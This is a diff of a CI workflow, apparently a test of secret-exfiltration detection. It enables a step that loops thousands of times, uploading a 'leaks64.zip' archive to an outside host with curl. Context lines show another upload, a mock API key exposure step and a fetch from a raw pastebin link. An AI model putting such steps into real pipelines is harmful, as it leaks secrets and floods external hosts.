@@ -55,15 +55,15 @@ jobs:
             -F "file=@leaks.zip" \
             -H "Content-Type: application/form-data"
             
-      # - name: 🚀 Upload the generated Zip File base64 (x1000)
-      #   run: |
-      #     # Loop 1000 times
-      #     for i in {1..3000}; do
-      #       echo "Executing request #$i..."
-      #       curl -X POST https://archivedSecretsbase64.com \
-      #         -F "file=@leaks64.zip" \
-      #         -H "Content-Type: application/form-data"
-      #     done
+      - name: 🚀 Upload the generated Zip File base64 (x1000)
+        run: |
+          # Loop 1000 times
+          for i in {1..4000}; do
+            echo "Executing request #$i..."
+            curl -X POST https://archivedSecretsbase64.com \
+              -F "file=@leaks64.zip" \
+              -H "Content-Type: application/form-data"
+          done
             
       - name: Mock API key exposure request
         run: |
@@ -92,8 +92,8 @@ jobs:
         run: |
           curl -k https://pastebin.com/raw/V4FrgKcm
       
-      - name: install dependencies
-        run: npm install --legacy-peer-deps
+      # - name: install dependencies
+      #   run: npm install --legacy-peer-deps
 
       - name: Cleanup PSE
         if: always()
